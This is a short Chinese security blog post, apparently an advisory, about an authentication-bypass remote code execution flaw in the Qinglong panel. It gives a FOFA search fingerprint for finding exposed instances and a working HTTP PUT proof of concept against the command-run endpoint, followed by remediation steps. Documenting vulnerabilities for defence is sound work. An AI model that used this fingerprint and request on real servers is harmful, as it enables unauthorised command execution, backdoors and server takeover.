---
title: 【红队】青龙面板远程RCE漏洞
date: 2026-03-02
categories:
  - 红队
image: /images/120.webp
---
# 漏洞详情
```
青龙面板最新版本鉴权绕过导致远程代码执行漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
```
**鉴于该漏洞影响范围较大，建议尽快做好自查及防护。**
# fofa语法
```
icon_hash=="-254502902"
```
# POC
```
PUT /aPi/system/command-run HTTP/1.1
Host: xxxx:5700
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 23
Content-Type: application/json

{

  "command": "ls"

}
```
利用成功证明：发送如上的http请求包，请求包中command参数设置为系统命令ls（Linux列出当前文件目录下文件的命令），发送并查看响应包，包中显示的当前服务器的文件目录，说明远程命令执行成功，漏洞存在。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302123304.png)
# 修复建议
针对已安装青龙面板的用户，官方给出了明确的应急处置方案。第一步是自查风险，通过SSH方式登录NAS，检查路径/ql/data/db/下是否存在陌生的.fullgc恶意文件，同时使用top命令观察系统进程，排查是否有CPU、内存异常高占用的未知进程。这一步就像是给设备做一次全面的体检，及时发现潜在的问题。如果发现了恶意文件或异常进程，用户需要立即停止青龙容器及相关服务，并彻底删除恶意文件，避免其持续破坏设备。关闭公网映射也是非常重要的一步，若此前已将5700/15700端口映射到公网，务必立即关闭，杜绝不法分子通过漏洞远程攻击的可能。在开发者未发布官方安全修复版本并经厂商验证前，建议直接停用青龙面板，切勿抱有侥幸心理继续使用。